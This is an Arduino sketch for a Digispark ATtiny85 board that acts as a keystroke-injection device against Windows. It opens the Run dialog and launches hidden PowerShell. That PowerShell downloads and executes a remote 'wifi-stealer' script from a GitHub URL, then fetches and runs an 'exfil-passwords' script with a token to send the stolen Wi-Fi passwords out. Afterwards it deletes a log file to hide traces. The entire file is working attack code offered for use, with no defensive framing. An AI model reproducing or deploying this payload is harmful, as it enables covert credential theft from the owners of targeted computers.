#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key

#define stealScript "https://raw.githubusercontent.com/Rival420/ATtiny85-test/main/wifi-stealer"
#define exfilScript "https://raw.githubusercontent.com/Rival420/ATtiny85-test/main/exfil-passwords"
#define token ""

void setup() {
  // put your setup code here, to run once:
  pinMode(1, OUTPUT); //LED on Model A 

}

void my_delay(int number) {
  DigiKeyboard.delay(number);
}

void get_wifipasswords() {
  //WIN+R (run)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  my_delay(200);
  DigiKeyboard.println("powershell -windowstyle hidden IEX(wget " stealScript " | select content)");
  my_delay(5000); // wait untill powershell script finishes
}

void exfil_wifipasswords() {
  DigiKeyboard.sendKeyStroke(0);
  my_delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  my_delay(200);
  DigiKeyboard.println("powershell.exe");
  my_delay(1000);
  DigiKeyboard.println("$token=\"" token "\"");
  my_delay(500);
  DigiKeyboard.println("iex(wget " exfilScript " | select -ExpandProperty content)");
  my_delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  my_delay(1000);
  DigiKeyboard.println("rm Log.txt");
  DigiKeyboard.println("exit");
}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  my_delay(3000);
  get_wifipasswords();
  exfil_wifipasswords();
  my_delay(9000);
  digitalWrite(1, HIGH); 
  my_delay(90000);
  digitalWrite(1, LOW); 
  my_delay(5000);

}
